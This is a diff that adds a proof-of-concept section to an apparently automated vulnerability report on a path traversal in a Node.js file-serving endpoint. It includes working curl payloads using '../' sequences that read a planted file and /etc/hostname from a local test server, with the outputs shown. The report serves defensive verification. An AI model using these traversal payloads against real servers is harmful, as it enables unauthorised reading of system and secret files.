@@ -82,3 +82,57 @@ kind = "not_found"
 source = "index.js:27-36"
 guarantee = "no blocker found in sendFile function that prevents path traversal via .. in the name parameter"
 ```
+
+---
+
+## PoC Attempt
+
+**Result**: POC_PASS
+**Date**: 2026-09-23
+**PoC by**: claude-haiku-4-5, default
+**Target**: Direct server testing with curl
+
+### Demonstration
+
+The vulnerability was successfully demonstrated by starting the vulnerable Node.js service and sending HTTP requests with path traversal sequences in the `name` query parameter. The server successfully returned the contents of files outside the `public/` directory, including both a custom sensitive file placed at the repository root and system files like `/etc/hostname`. This confirms that the path traversal vulnerability allows arbitrary file read access to the filesystem.
+
+### Test Execution
+
+**Payload 1 - Custom sensitive file outside public/**:
+```bash
+# Created sensitive.txt at repository root (outside public/ directory)
+echo "This is a sensitive file outside public directory" > sensitive.txt
+
+# Started the server on port 3234
+PORT=3234 node index.js &
+
+# Sent the traversal payload
+curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3234/file?name=../sensitive.txt'
+```
+
+**Output 1**:
+```
+This is a sensitive file outside public directory
+status=200
+```
+
+**Payload 2 - System file access**:
+```bash
+curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3234/file?name=../../../../../../etc/hostname'
+```
+
+**Output 2**:
+```
+gessy-e2e-run12-20260923
+status=200
+```
+
+### Verification
+
+Both requests returned HTTP 200 status code with the full contents of files outside the `public/` directory. This confirms:
+1. The path traversal sequences (`../`) are processed by `path.join()` without validation
+2. The final resolved path escapes the `public/` directory boundary
+3. Files outside `public/` are readable and their contents are returned in the HTTP response
+4. No validation guard prevents access to arbitrary files
+
+The vulnerability is **confirmed** and **exploitable**.
